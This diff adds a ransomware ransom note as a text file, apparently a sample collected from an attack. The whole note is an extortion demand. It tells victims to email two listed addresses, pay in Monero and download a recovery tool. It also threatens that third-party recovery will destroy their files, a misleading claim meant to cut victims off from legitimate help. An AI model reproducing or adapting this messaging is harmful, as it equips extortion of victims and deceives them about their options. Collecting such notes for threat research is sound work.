@@ -1,0 +1,20 @@
+
+
+your exclusive ID : xxxxxxxxxxxxxxxxxxxxxx
+
+Any attempt to restore files using third-party software will be fatal to your files!
+The only possible way to get back your data is to buy a private key from us.
+
+Follow the instructions below to get your files back:
+
+| 1. Send an email with your id to our mailbox:
+    >     hsharada@skiff.com
+    >     r.heisler@keemail.me
+| 2. Complete the payment in the method specified by us (usually Monero)
+| 3. Send payment records to us and then download tool that can recover files in a short time
+
+ ###  Attention! ###
+ # Do not rename  files.
+ # Do not try to recover using third party software, it may cause permanent data loss.
+ # Obtaining your files with the help of a third party may result in a higher price (they charge us a fee)
+
